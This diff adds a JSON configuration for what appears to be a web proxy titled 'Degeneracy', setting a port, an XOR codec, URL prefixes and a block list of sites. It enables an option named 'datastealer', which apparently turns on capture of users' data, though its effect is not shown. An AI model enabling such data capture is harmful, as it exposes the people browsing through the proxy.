@@ -1,0 +1,10 @@
+{
+    "port": 8443,
+    "ssl": true,
+    "title": "Degeneracy",
+    "prefix": "/go/",
+    "codec": "xor",
+    "datastealer": true,
+    "blacklist": ["pornhub.com", "porn.com", "accounts.google.com", "xvideos.com"],
+    "smokeprefix": "/web/"
+} 
